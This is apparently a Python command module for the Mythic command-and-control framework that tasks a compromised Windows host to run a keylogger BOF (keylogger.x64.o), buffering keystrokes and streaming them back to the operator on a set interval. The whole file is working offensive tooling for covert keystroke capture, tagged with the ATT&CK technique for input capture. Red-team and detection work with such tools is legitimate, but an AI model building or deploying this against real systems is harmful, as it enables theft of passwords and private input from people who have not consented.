from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging, sys, base64

from .utils.bof_utilities import upload_module_if_missing

logging.basicConfig(level=logging.INFO)


class KeyloggerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="interval",
                cli_name="Interval",
                display_name="Dump Interval (ms)",
                type=ParameterType.Number,
                description="How often to dump the keystroke buffer in milliseconds (default 30000, min 1000).",
                default_value=30000,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=1,
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("interval", 30000)
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        parts = self.command_line.strip().split()
        if len(parts) == 1 and parts[0].isdigit():
            self.add_arg("interval", int(parts[0]))
        elif len(parts) >= 2 and parts[0].lower() in ("-interval", "interval"):
            self.add_arg("interval", int(parts[1]))
        else:
            raise Exception(
                "Invalid arguments.\n\tUsage: {}".format(KeyloggerCommand.help_cmd)
            )


class KeyloggerCommand(CommandBase):
    cmd = "keylogger"
    needs_admin = False
    help_cmd = "keylogger [-Interval 30000]"
    description = (
        "Start an async BOF keylogger that buffers keystrokes and dumps them "
        "on an interval. Live output streams on this task. "
        "Stop with: jobkill <keylogger_task_uuid>"
    )
    version = 1
    author = "@c0rnbread"
    attackmapping = ["T1056.001"]
    argument_class = KeyloggerArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
        suggested_command=False,
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        try:
            interval = taskData.args.get_arg("interval")
            if interval is None:
                interval = 30000
            interval = int(interval)
            if interval < 1000:
                interval = 1000

            response.DisplayParams = "-Interval {}".format(interval)

            bof_file = "keylogger.x64.o"
            upload_result = await upload_module_if_missing(
                file_name=bof_file, taskData=taskData, force=True
            )
            if not upload_result:
                response.Success = False
                response.Error = f"Failed to upload module \"{bof_file}\"."
                return response

            bof_file_id = upload_result if isinstance(upload_result, str) else None
            if not bof_file_id:
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    Filename=bof_file,
                    LimitByCallback=False,
                    MaxResults=1,
                ))
                if not file_resp.Success or len(file_resp.Files) == 0:
                    raise Exception(
                        f"Failed to find {bof_file} after upload. Have you rebuilt Modules/bin?"
                    )
                bof_file_id = file_resp.Files[0].AgentFileId

            bof_contents = await SendMythicRPCFileGetContent(
                MythicRPCFileGetContentMessage(AgentFileId=bof_file_id)
            )
            if not bof_contents.Success:
                raise Exception(f"Failed to fetch BOF file from Mythic (ID: {bof_file_id})")

            bof_data_b64 = base64.b64encode(bof_contents.Content).decode("utf-8")
            group = ParameterGroupInfo(group_name="Default")

            taskData.args.add_arg(
                "bof_arguments",
                [["int32", interval]],
                type=ParameterType.TypedArray,
                parameter_group_info=[group],
            )
            taskData.args.add_arg(
                "bof_data",
                bof_data_b64,
                parameter_group_info=[group],
            )
            taskData.args.remove_arg("interval")

            task_uuid = getattr(taskData.Task, "AgentTaskID", None) or getattr(
                taskData.Task, "agent_task_id", None
            )
            stop_hint = (
                f"Started keylogger. Stop with: jobkill {task_uuid}\n"
                if task_uuid
                else "Started keylogger. Stop with: jobkill <keylogger_task_uuid> (see jobs)\n"
            )
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=stop_hint,
                )
            )

            return response

        except Exception as e:
            raise Exception(
                "Error from Mythic: "
                + str(sys.exc_info()[-1].tb_lineno)
                + " : "
                + str(e)
            )

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
